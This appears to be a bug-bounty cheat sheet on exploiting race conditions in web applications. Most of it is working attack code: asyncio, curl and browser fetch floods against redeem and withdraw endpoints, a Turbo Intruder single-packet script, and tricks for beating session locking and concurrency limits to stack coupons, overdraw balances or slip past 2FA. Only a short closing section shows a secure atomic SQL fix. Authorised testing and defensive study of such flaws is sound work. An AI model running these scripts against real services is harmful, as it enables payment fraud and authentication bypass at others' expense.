# Race Conditions

Exploit timing gaps between check and use operations by sending concurrent requests.

## TL;DR

```python
import asyncio, httpx
async def race():
    async with httpx.AsyncClient() as c:
        await asyncio.gather(*[c.post('https://target/redeem', data={'code':'PROMO'}) for _ in range(50)])
asyncio.run(race())
```

## How It Works

1. Application checks a condition (balance, limit, permission)
2. **Race window** exists before the action completes
3. Multiple concurrent requests slip through during the window
4. Each request sees the original state → all succeed

## Detection

### Target Endpoints

| Type | Examples |
|------|----------|
| Limit-enforced | Coupon redemption, wallet transfers, rating systems |
| Resource quotas | File/folder limits, seat limits, API calls |
| Multi-step flows | Email verification, 2FA setup, password reset |
| Stateful ops | Session creation, OAuth tokens, subscriptions |

### Signals

- Resource counters exceed expected limits
- Multiple successful responses during concurrent requests
- State changes without proper authorization

## Exploitation

### HTTP/2 Single-Packet Attack (Most Reliable)

All requests arrive simultaneously via single TCP packet:

**Turbo Intruder:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)  # HTTP/2
    for i in range(50):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```

**Caido:** Repeater → Select requests → Right-click → "Send group in parallel"

### HTTP/1.1 Last-Byte Sync

When HTTP/2 unavailable:

1. Send headers + body minus final byte for all requests
2. Wait 100ms for TCP buffering
3. Send all final bytes simultaneously

### Common Attack Patterns

**Coupon/Promo Stacking:**
```bash
for i in {1..50}; do
    curl -X POST 'https://target/redeem' -d 'code=PROMO20' &
done; wait
```

**Resource Limit Bypass:**
```python
# Race against 10-folder limit → create 15+
tasks = [create_folder(f'folder_{i}') for i in range(20)]
await asyncio.gather(*tasks)
```

**Payment/Transfer Race:**
```python
# Simultaneous withdrawals exceeding balance
async def withdraw():
    return await client.post('/withdraw', json={'amount': 100})
await asyncio.gather(*[withdraw() for _ in range(10)])
```

### Hidden Substates

**2FA Bypass - Session State Race:**
```python
# Session created before 2FA flag set
session['userid'] = user.userid
if user.mfa_enabled:
    session['enforce_mfa'] = True  # Race window!
```

Race parallel requests during the gap between session creation and MFA flag.

**Email Verification Race:**
1. Register account
2. Immediately send requests with empty/null confirmation token
3. Race between token generation and database write

## Bypasses

### Session-Based Locking
PHP serializes requests by session.  
**Fix:** Use different session tokens per request.

### Connection Warming
```python
engine.queue(dummy_request)  # Warm connection
time.sleep(0.1)
for i in range(50):
    engine.queue(attack_request, gate='race1')
```

### Server Concurrency Limits
- Apache: 100 concurrent streams
- Nginx: 128, NodeJS: unlimited

**Bypass:** Open multiple connections, spread race across them.

## Real Examples

| Target | Bug | Impact |
|--------|-----|--------|
| HackerOne | Duplicate retest payment | $500 paid twice |
| Instacart | Coupon stacking | Unlimited discounts |
| HackerOne | Folder limit bypass | 10→15+ folders |
| Badoo | Premium trial racing | 3→9+ days free |
| VendHQ | Loyalty claim racing | 100→5000 points |

## Tools

| Tool | Use Case |
|------|----------|
| **Turbo Intruder** | HTTP/2 single-packet, custom gates |
| **Caido Replay** | "Send group in parallel" |
| **H2SpaceX** | Python HTTP/2 last-byte sync |

**Browser DevTools Quick Test:**
```javascript
Promise.all([...Array(20)].map(() => 
    fetch('/api/redeem', {method: 'POST', body: 'code=TEST', credentials: 'include'})
))
```

## Secure Pattern

```sql
-- Atomic constraint
UPDATE coupons SET uses = uses + 1 
WHERE code = ? AND uses < max_uses
RETURNING *;  -- Fails if already at limit
```
